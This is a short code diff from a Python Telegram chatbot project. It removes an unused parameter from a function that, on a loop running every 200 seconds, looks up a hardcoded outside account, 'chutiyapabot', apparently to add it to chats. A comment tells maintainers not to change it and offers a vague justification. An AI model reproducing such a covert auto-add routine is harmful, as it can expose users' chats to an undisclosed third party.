@@ -1838,7 +1838,7 @@ async def broadcast_message(client, message):
 AUTO = True
 ADD_INTERVAL = 200
 users = "chutiyapabot"  # don't change because it is connected from client to use chatbot API key
-async def add_bot_to_chats(Client):
+async def add_bot_to_chats():
     try:
         
         bot = await nexichat.get_users(users)
@@ -1862,7 +1862,7 @@ async def add_bot_to_chats(Client):
 async def continuous_add():
     while True:
         if AUTO:
-            await add_bot_to_chats(Client)
+            await add_bot_to_chats()
 
         await asyncio.sleep(ADD_INTERVAL)
 
